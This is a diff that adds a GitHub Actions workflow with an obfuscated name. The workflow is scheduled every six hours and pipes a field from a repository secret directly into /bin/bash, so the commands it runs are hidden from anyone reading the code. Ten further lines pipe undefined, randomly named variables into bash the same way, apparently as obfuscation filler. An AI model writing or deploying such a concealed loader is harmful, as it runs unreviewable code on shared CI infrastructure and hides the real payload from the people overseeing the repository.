@@ -1,0 +1,29 @@
+name: meizhangpaishenang
+
+on:
+  workflow_dispatch:
+  schedule:
+    - cron: '29 5/6 * * *'
+
+jobs:
+  build:
+    runs-on: ubuntu-latest
+
+    steps:
+      - uses: actions/checkout@v4
+      - name: meizhangpaishenang
+        env:
+          fp358: ${{ secrets.fp358 }}
+        run: |
+          echo $fp358 | jq -r .x192 | /bin/bash
+          echo $w152 | jq -r .nd8692 | /bin/bash
+          echo $o908 | jq -r .g7 | /bin/bash
+          echo $ahg2 | jq -r .dc4796 | /bin/bash
+          echo $aduj61 | jq -r .fxsy4225 | /bin/bash
+          echo $wf03 | jq -r .zjtu4 | /bin/bash
+          echo $rxjm327 | jq -r .wazec3811 | /bin/bash
+          echo $mjxd5225 | jq -r .y0346 | /bin/bash
+          echo $hqpyp97 | jq -r .iqbz22022 | /bin/bash
+          echo $gyca51 | jq -r .j70298 | /bin/bash
+          echo $mojkn4926 | jq -r .l662 | /bin/bash
+
